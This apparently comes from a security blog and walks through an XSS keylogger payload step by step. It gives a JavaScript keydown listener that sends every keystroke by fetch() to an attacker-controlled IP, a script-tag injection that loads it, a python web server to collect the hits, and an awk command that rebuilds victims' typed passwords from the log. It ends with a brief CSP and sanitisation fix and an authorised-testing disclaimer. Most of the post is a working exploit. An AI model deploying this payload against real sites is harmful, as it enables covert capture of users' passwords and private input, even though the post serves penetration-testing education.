---
layout: single
title: "XSS — Keylogging via XSS"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - keylogging
  - credential-capture
  - javascript
  - stored-xss
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
  - awk
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "Attach a keydown event listener through an XSS payload to silently capture everything the victim types — passwords, search queries, form inputs — and stream it to your server."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## The Attack

`document.addEventListener('keydown', fn)` fires on every keypress. Combine this with `fetch()` to stream keystrokes to your server in real time.

## Step-by-Step

**Step 1 — Create `xss.js`:**

```javascript
function logKey(event) {
    fetch("http://192.168.XX.XX/k?key=" + event.key)
}
document.addEventListener('keydown', logKey);
```

**Step 2 — Start server:**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit the injection:**

```html
<script src="http://192.168.XX.XX/xss.js"></script>
```

**Step 4 — Parse the captured keystrokes:**

<div class="tool-cmd">awk '{split($7,a,"="); print a[2]}' log.txt | tr -d '\n'</div>

## What You Receive

<div class="tool-out">GET /k?key=p HTTP/1.1
GET /k?key=a HTTP/1.1
GET /k?key=s HTTP/1.1
GET /k?key=s HTTP/1.1
GET /k?key=w HTTP/1.1</div>

Each keypress arrives as a separate GET request. Parse the log and reconstruct the plaintext of everything the victim typed — including passwords entered while the script runs.

<div class="remediation-box"><strong>Fix:</strong> CSP with strict <code>script-src</code> prevents attacker-hosted scripts from loading. HttpOnly cookies ensure session tokens can't be stolen even if the keylogger runs. Sanitise all inputs to prevent initial injection.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
